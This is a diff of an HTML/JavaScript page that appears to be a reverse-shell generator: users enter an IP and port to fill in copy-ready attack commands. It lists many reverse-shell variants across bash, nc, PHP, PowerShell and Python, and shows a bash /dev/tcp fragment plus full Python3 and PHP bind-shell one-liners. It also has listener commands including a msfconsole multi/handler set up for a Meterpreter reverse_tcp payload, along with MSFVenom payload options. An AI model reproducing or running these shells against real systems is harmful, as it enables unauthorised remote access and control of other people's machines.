@@ -275,12 +275,10 @@ background-color: #666;
 
 <p>Port:</p>
  <input id="numb" id="port" onchange="secFunction()">
-
-
-      <p> </p>
     
   </ul>
-  <div class="w3-container w3-indigo"><span class="w3-right"> </span></div>
+  
+  
 </div>
 </div>
 
@@ -289,11 +287,57 @@ background-color: #666;
   <div class="w3-container w3-theme">
     <h3>Listener</h3>
   </div>
+ 
   <div class="w3-container">
   
-  <h3 class="w3-text-theme w3-large">    
-
+  <h3 class="w3-text-theme w3-large"> 
   
+  <div class="w3-center">
+<div class="w3-bar w3-theme">
+
+ 
+   <button class="w3-bar-item w3-button w3-border testbuttn w3-medium" onclick="listener(event,'other types')">Others</button>
+  <button class="w3-border w3-button w3-medium testbuttn" onclick="listener(event,'socat')">socat</button>
+  <button class="w3-bar-item w3-button w3-border testbuttn w3-medium" onclick="listener(event,'MSF')">msfconsole</button>
+
+ </div>
+  
+   </div>
+ 
+  <div id="socat" class="w3-container city1 w3-animate-opacity">
+  <br>
+<div id="mydiv">
+      <p>socat -d -d TCP-LISTEN:</p>
+      <p id="port hundred one"></p>
+  <p> &nbsp;STDOUT</p>
+  </div>
+ </div>
+ 
+ 
+  
+  <div id="MSF" class="w3-container city1 w3-left-align w3-animate-opacity">
+    <br>
+ 
+   <p>
+    msfconsole -q -x &#8243use multi/handler; 
+    set payload windows/x64/meterpreter/reverse_tcp;
+    </p>
+    <div id="mydiv">
+  <p>  set lhost&nbsp</p>
+   <p id="demo"></p>
+<p>; set lport&nbsp</p>
+
+ <p id="port hundred"> </p>
+  <p>; exploit&#8243</p>
+  </div>
+  
+<br>
+<br>
+  
+ </div>
+ 
+ <div id="other types" class="w3-container city1 w3-animate-opacity">
+ <br>
     <label for="type">Type:</label>
 
 <select class="type" name="type">
@@ -308,12 +352,11 @@ background-color: #666;
    <option value="python3 -m pwncat -lp &nbsp; ">pwncat</option>
     <option value="stty raw -echo; (stty size; cat) | nc -lvnp &nbsp;">windows ConPty</option>
     
-     <option value="socat -d -d TCP-LISTEN:" >socat </option>
+
 
       <option value="socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:">socat (TTY)</option>
        <option value="powercat -l -p &nbsp; ">powercat</option>
-        <option value="msfconsole -q -x &#8243;use multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set lhost &nbsp; ">msfconsole</option>
-        
+       
 </select>
 
 
@@ -321,41 +364,18 @@ background-color: #666;
 <br>
    <div id ="mydiv">
    
- <div class="result" onclick= "specialFunction()"></div>
- <br>
- <br>
- 
- 
+ <div class="result"></div>
+  
    <p id="input port"> </p>
-     <p id="MSF"></p>
-    <p id="socat" ></p>
-    <p id="demo"> </p>
-       <p id="MSF2"></p>
-
+  
      </div>
-     <script>
-    function update() {
-var select = document.getElementById('type');
-var option = select.options[select.selectedIndex];
-                
-if(option.text=="socat")
-{
-   document.getElementById("socat").innerHTML = " STDOUT";			
-}
- 
-}
-            </script>
-   <div class="w3-container">
-  <h3 class="w3-text-theme">  
+  
+      
+      
+   
  
   <script>
  
-
-
-  
-
- 
-
 
   const selectElement = document.querySelector('.type');
 
@@ -368,49 +388,20 @@ result.textContent = `  ${event.target.value}`;
 });
 
   </script>  
- <div class=" w3-large">
- <div <button onclick="specialFunction()">if its socat,click me</button> </div>
- 
- <div <button onclick="MSFFunction()">if its MSF,click me</button> </div>
- 
+
+
+ </div>
+</div>
+</div>
+</div>
  
 </div>
-
-<script>
- 
-
-function specialFunction() {
- document.getElementById("socat").innerHTML = "&nbsp;STDOUT";
-}
-
-function MSFFunction() {
-
+</div>
    
- document.getElementById("MSF").innerHTML = "; set lport &nbsp;";
  
-  document.getElementById("MSF2").innerHTML = "; exploit&#8243";
- 
- 
-}
-</script>
-    
-
-
-
-
-<h1> </h1>
-</h3>
-  </div>
-
-</div>
-</div>
-</div>
- 
-
-</div>
   
-<hr>
-
+ 
+<br>
  
 <div class="w3-center">
 <div class="w3-bar w3-theme">
@@ -506,78 +497,77 @@ selectElement.addEventListener('change', (event) => {
  
 <!-- The filterable elements. Note that some have multiple class names (this can be used if they belong to multiple categories) -->
  <div class="tab vertical-menu w3-large w3-container w3-border float-left-child">
+ <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashi')" id="openonceagain">Bash -i</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash196')">Bash 196</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashread')" >Bash read line</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash5')">Bash 5</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashudp')">Bash udp</div>
 
-  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashi')">Bash -i</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash196')">Bash 196</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashread')" >Bash read line</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bash5')">Bash 5</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'bashudp')">Bash udp</div>
-
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nce')">nc -e</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncexe')">nc.exe -e</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncc')">nc -c</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nce')">nc -e</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncexe')">nc.exe -e</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncc')">nc -c</div>
  
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncatudp')">ncat udp</div>
-      <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncate')">ncat -e</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncmkfifo')">nc mkfifo</div>
-    <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncatexe')">ncat.exe -e</div>
-   <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'C')">C     </div>
-  <div class="w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'Cwindows')">C Windows</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'C#')">C#</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Haskell')">Haskell #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perl')">Perl</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perlnosh')">Perl no sh</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rustcat')">rustcat     </div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPemoji')">PHP Emoji</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac"  onclick="City(event, 'PHPpentest')">PHP PentestMonkey</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPivan')">PHP Ivan Sincek</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPcmd')">PHP cmd</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPexec')">PHP exec</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPshellexec')">PHP shell_exec</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPsys')">PHP system</div>
-   <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPpassthru')">PHP passthru</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHP')">PHP `</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPpopen')">PHP popen</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPproc')">PHP proc_open</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'windowsconpty')">Windows ConPty</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Awk')">Awk</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power1')">PowerShell #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power2')">PowerShell #2</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power3')">PowerShell #3</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power4')">PowerShell #4 (TLS)</div>
-  <div class="w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'power364')">PowerShell #3 (Base64)</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncatudp')">ncat udp</div>
+      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncate')">ncat -e</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ncmkfifo')">nc mkfifo</div>
+    <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'ncatexe')">ncat.exe -e</div>
+   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'C')">C     </div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'Cwindows')">C Windows</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'C#')">C#</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Haskell')">Haskell #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perl')">Perl</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'perlnosh')">Perl no sh</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rustcat')">rustcat     </div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPemoji')">PHP Emoji</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac"  onclick="City(event, 'PHPpentest')">PHP PentestMonkey</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPivan')">PHP Ivan Sincek</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPcmd')">PHP cmd</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPexec')">PHP exec</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPshellexec')">PHP shell_exec</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPsys')">PHP system</div>
+   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'PHPpassthru')">PHP passthru</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHP')">PHP `</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPpopen')">PHP popen</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'PHPproc')">PHP proc_open</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'windowsconpty')">Windows ConPty</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'Awk')">Awk</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power1')">PowerShell #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power2')">PowerShell #2</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power3')">PowerShell #3</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'power4')">PowerShell #4 (TLS)</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Windows " onclick="City(event, 'power364')">PowerShell #3 (Base64)</div>
    
-<div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'zsh')">zsh</div>
+<div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'zsh')">zsh</div>
 
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py1')">Python #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py2')">Python #2</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py31')">Python3 #1</div>
-   <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py32')">Python3 #2</div>
-    <div class="w3-bar-item w3-button filterDiv All Linux" onclick="City(event, 'py3short')">Python3 shortest</div>
-      <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'telnet')">telnet</div>
-      <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ruby1')">Ruby #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rubynosh')">Ruby no sh</div>
-        <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'dart')">Dart</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat1')">socat #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat2')" >socat #2 (TTY)</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py1')">Python #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py2')">Python #2</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py31')">Python3 #1</div>
+   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'py32')">Python3 #2</div>
+    <div class="tablinks w3-bar-item w3-button filterDiv All Linux" onclick="City(event, 'py3short')">Python3 shortest</div>
+      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'telnet')">telnet</div>
+      <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'ruby1')">Ruby #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'rubynosh')">Ruby no sh</div>
+        <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'dart')">Dart</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat1')">socat #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'socat2')" >socat #2 (TTY)</div>
 
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nodejs')">node.js</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'nodejs2')">node.js #2</div>
-      <div class="w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'groovy')">Groovy</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'nodejs')">node.js</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'nodejs2')">node.js #2</div>
+      <div class="tablinks w3-bar-item w3-button filterDiv All Windows" onclick="City(event, 'groovy')">Groovy</div>
       
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java1')">Java #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java2')">Java #2</div>
-   <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'java3')">Java #3</div>
-    <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'js')">Javascript</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java1')">Java #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'java2')">Java #2</div>
+   <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'java3')">Java #3</div>
+    <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'js')">Javascript</div>
 
-  <div class="w3-bar-item w3-button filterDiv All Linux " onclick="City(event, 'lua1')">Lua #1</div>
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'lua2')">Lua #2</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux " onclick="City(event, 'lua1')">Lua #1</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows" onclick="City(event, 'lua2')">Lua #2</div>
 
-  <div class="w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'golang')">Golang</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Windows Mac" onclick="City(event, 'golang')">Golang</div>
 
 
 
-  <div class="w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'vlang')">Vlang</div>
+  <div class="tablinks w3-bar-item w3-button filterDiv All Linux Mac" onclick="City(event, 'vlang')">Vlang</div>
  
  </div>
 
@@ -587,7 +577,7 @@ selectElement.addEventListener('change', (event) => {
  
 
   
-  <div class="shellans"> </div>
+ 
      
 
 <div id="bashi" class="tabcontent">
@@ -597,8 +587,9 @@ selectElement.addEventListener('change', (event) => {
 
   
     <p>Command:</p>
+    <div class="shellanswer"> </div>
     <div id="mydiv">
-        <div class="shellans"> </div>
+         
     <p> &nbsp -i >& /dev/tcp/ </p>
     <p id="ip eighteen"></p>
 
@@ -617,14 +608,13 @@ selectElement.addEventListener('change', (event) => {
   const selectElement = document.querySelector('.shell');
 
 selectElement.addEventListener('change', (event) => {
-  const shellans = document.querySelector('.shellans');
+  const shellanswer = document.querySelector('.shellanswer');
  
  
-shellans.textContent = `  ${event.target.value}`;
+shellanswer.textContent = `  ${event.target.value}`;
 
 });
  
-
 
 </script>
 </div>
@@ -2773,20 +2763,23 @@ ref.add(new StringRefAddr("x", x);</p>
 </div>
 
 <div id="Bind" class="w3-container city w3-animate-opacity">
-
-
+ 
+ <br>
+ <br>
 <div class="w3-container">
-<div class="float-child">
-
+ <div id="no">
+<br>
 <div class="tab">
-  <button class="tablinks" onclick="City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
-  <button class="tablinks" onclick="City(event, 'PHP Bind')">PHP Bind</button>
+  <button class="tablinks" onclick=" City(event, 'Python3 Bind')" id="defaultOpen">Python3 Bind</button>
+  <button class="tablinks" onclick=" City(event, 'PHP Bind')">PHP Bind</button>
 </div>
 
 <div id="Python3 Bind" class="tabcontent">
-<div class="float-child">
+ 
   <h3 class="w3-text-theme w3-large w3-display-container"> 
-<div id="mydiv">
+ 
+  <p>
+  <div id="mydiv">
   <p>
   python3 -c 'exec("""import socket as s,
   subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);
@@ -2803,15 +2796,21 @@ stdin=sp.PIPE);c.sendall
 (p.stdout.read()+p.stderr.read())""")'
 </p>
 </div>
+</p>
   </div>
-</div>
 
+
+ 
+  
 
 <div id="PHP Bind" class="tabcontent">
-<div class="float-child">
+ 
   <h3 class="w3-text-theme w3-large w3-display-container"> 
+   <p>
+   <div id="mydiv">
   <p> 
-  php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
+  php -r '$s=socket_create
+  (AF_INET,SOCK_STREAM,SOL_TCP);
   socket_bind($s,"0.0.0.0",
   </p>
  
@@ -2826,13 +2825,15 @@ stdin=sp.PIPE);c.sendall
   {$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
   </p>
 </div>
+</p>
+
+</div>
  
 </div>
-
+ </div>
  
  </div>
-</div>
-</div>
+ 
   
 <div id="MSFVenom" class="w3-container city w3-animate-opacity">
  
@@ -2843,7 +2844,7 @@ stdin=sp.PIPE);c.sendall
  <div class=" tab vertical-menu w3-bar-item w3-container">
  
 
-  <button class="tablinks" onclick="City(event, 'WMSR')" id="defaultOpen">Windows Meterpreter Staged Reverse TCP (x64)</button>
+  <button class="tablinks" onclick="City(event, 'WMSR')" id="openagain">Windows Meterpreter Staged Reverse TCP (x64)</button>
   <button class="tablinks" onclick="City(event, 'WMSlessR')">Windows Meterpreter Stageless Reverse TCP (x64)</button>
   <button class="tablinks" onclick="City(event, 'WSR')">Windows Staged Reverse TCP (x64)</button>
     <button class="tablinks" onclick="City(event, 'WSRTCP')">Windows Stageless Reverse TCP (x64)</button>
@@ -3171,19 +3172,20 @@ function w3_close() {
 
 // Tabs
 function openCity(evt, cityName) {
-  var i;
+  var i,x,tablinks;
   var x = document.getElementsByClassName("city");
   for (i = 0; i < x.length; i++) {
     x[i].style.display = "none";
   }
   var activebtn = document.getElementsByClassName("testbtn");
   for (i = 0; i < x.length; i++) {
-    activebtn[i].className = activebtn[i].className.replace(" w3-dark-grey", "");
+    activebtn[i].className = activebtn[i].className.replace(" w3-indigo", "");
   }
   document.getElementById(cityName).style.display = "block";
-  evt.currentTarget.className += " w3-dark-grey";
+  evt.currentTarget.className += " w3-indigo";
 }
 
+ 
 var mybtn = document.getElementsByClassName("testbtn")[0];
 mybtn.click();
  
@@ -3196,32 +3198,39 @@ mybtn.click();
   }
   tablinks = document.getElementsByClassName("tablinks");
   for (i = 0; i < tablinks.length; i++) {
-    tablinks[i].className = tablinks[i].className.replace(" active", "");
+    tablinks[i].className = tablinks[i].className.replace(" w3-indigo", "");
   }
   document.getElementById(cityName).style.display = "block";
-  evt.currentTarget.className += " active";
+  evt.currentTarget.className += " w3-indigo";
 }
-
- function special(evt, cityName) {
-  var i, tabspecial, tablinks;
-  tabspecial = document.getElementsByClassName("tabspecial");
-  for (i = 0; i < tabspecial.length; i++) {
-    tabspecial[i].style.display = "none";
-  }
-  tablinks = document.getElementsByClassName("tablinks");
-  for (i = 0; i < tablinks.length; i++) {
-    tablinks[i].className = tablinks[i].className.replace(" active", "");
-  }
-  document.getElementById(cityName).style.display = "block";
-  evt.currentTarget.className += " active";
-}
-
+  
 
 // Get the element with id="defaultOpen" and click on it
 document.getElementById("defaultOpen").click();
+document.getElementById("openagain").click();
+ document.getElementById("openonceagain").click();
+ 
+ //for listeber
+ function listener(evt, cityName) {
+  var i,m,tablinks;
+  var m = document.getElementsByClassName("city1");
+  for (i = 0; i < m.length; i++) {
+    m[i].style.display = "none";
+  }
+  var activebtn = document.getElementsByClassName("testbuttn");
+  for (i = 0; i < m.length; i++) {
+    activebtn[i].className = activebtn[i].className.replace(" w3-indigo", "");
+  }
+  document.getElementById(cityName).style.display = "block";
+  evt.currentTarget.className += " w3-indigo";
+}
 
+  
+var mybuttn = document.getElementsByClassName("testbuttn")[0];
+mybuttn.click();
  
- 
+
+
  filterSelection("all")
 function filterSelection(c) {
   var x, i;
@@ -3281,10 +3290,10 @@ function myFunction() {
 // Get the value of the input field with id="numb"
   let x = document.getElementById("numbie2").value;
   // If x is Not a Number or less than one or greater than 10
-  let textsec;
- 
+   
   textsec =x;
   
+ 
  document.getElementById("demo").innerHTML = textsec;
   document.getElementById("ip one").innerHTML = textsec;
   document.getElementById("ip two").innerHTML = textsec;
@@ -3368,6 +3377,7 @@ function myFunction() {
               document.getElementById("ip seventy three").innerHTML = textsec;
                    document.getElementById("ip seventy four").innerHTML = textsec;
                         document.getElementById("ip seventy five").innerHTML = textsec;
+                         
 }
 
 
@@ -3387,7 +3397,8 @@ function secFunction() {
   {
   text= x;
   }
- 
+ document.getElementById("port hundred").innerHTML = text;
+                     document.getElementById("port hundred one").innerHTML = text;
  document.getElementById("input port").innerHTML = text;
   document.getElementById("port again").innerHTML = text;
   document.getElementById("port once again").innerHTML = text;
@@ -3454,7 +3465,7 @@ function secFunction() {
          document.getElementById("port seventy two").innerHTML = text;
               document.getElementById("port seventy three").innerHTML = text;
                    document.getElementById("port seventy four").innerHTML = text;
-                        document.getElementById("port seventy five").innerHTML = text;
+           document.getElementById("port seventy five").innerHTML = text;
                     
 }
   </script> 
@@ -3463,3 +3474,4 @@ function secFunction() {
 
 </body>
 </html>
+
